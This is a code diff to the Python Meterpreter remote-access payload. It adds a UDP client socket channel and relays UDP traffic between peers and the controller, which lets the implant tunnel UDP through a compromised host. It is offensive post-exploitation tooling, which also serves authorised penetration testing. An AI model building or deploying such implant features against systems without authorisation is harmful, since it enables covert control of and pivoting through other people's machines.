@@ -411,6 +411,9 @@ class MeterpreterChannel(object):
     def is_alive(self):
         return True
 
+    def notify(self):
+        return None
+
     def read(self, length):
         raise NotImplementedError()
 
@@ -500,6 +503,34 @@ export(MeterpreterSocketTCPClient)
 class MeterpreterSocketTCPServer(MeterpreterSocket):
     pass
 export(MeterpreterSocketTCPServer)
+
+#@export
+class MeterpreterSocketUDPClient(MeterpreterSocket):
+    def __init__(self, sock, peer_address):
+        super(MeterpreterSocketUDPClient, self).__init__(sock)
+        self.peer_address = peer_address
+
+    def core_write(self, request, response):
+        channel_data = packet_get_tlv(request, TLV_TYPE_CHANNEL_DATA)['value']
+        peer_host = packet_get_tlv(request, TLV_TYPE_PEER_HOST).get('value', self.peer_address[0])
+        peer_port = packet_get_tlv(request, TLV_TYPE_PEER_PORT).get('value', self.peer_address[1])
+        try:
+            length = self.sock.sendto(channel_data, (peer_host, peer_port))
+        except socket.error:
+            self.close()
+            self._is_alive = False
+            status = ERROR_FAILURE
+        else:
+            response += tlv_pack(TLV_TYPE_LENGTH, length)
+            status = ERROR_SUCCESS
+        return status, response
+
+    def read(self, length):
+        return self.sock.recvfrom(length)[0]
+
+    def write(self, data):
+        self.sock.sendto(data, self.peer_address)
+export(MeterpreterSocketUDPClient)
 
 class STDProcessBuffer(threading.Thread):
     def __init__(self, std, is_alive):
@@ -1005,6 +1036,8 @@ class PythonMeterpreter(object):
             for channel_id in channel_ids:
                 channel = self.channels[channel_id]
                 data = bytes()
+                pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
+                pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_write')
                 if isinstance(channel, MeterpreterProcess):
                     if not channel_id in self.interact_channels:
                         continue
@@ -1041,9 +1074,16 @@ class PythonMeterpreter(object):
                         pkt += tlv_pack(TLV_TYPE_PEER_PORT, client_addr[1])
                         pkt  = struct.pack('>I', len(pkt) + 4) + pkt
                         self.send_packet(pkt)
+                elif isinstance(channel, MeterpreterSocketUDPClient):
+                    if select.select([channel.fileno()], [], [], 0)[0]:
+                        try:
+                            data, peer_address = channel.sock.recvfrom(65535)
+                        except socket.error:
+                            self.handle_dead_resource_channel(channel_id)
+                        else:
+                            pkt += tlv_pack(TLV_TYPE_PEER_HOST, peer_address[0])
+                            pkt += tlv_pack(TLV_TYPE_PEER_PORT, peer_address[1])
                 if data:
-                    pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
-                    pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_write')
                     pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
                     pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
                     pkt += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
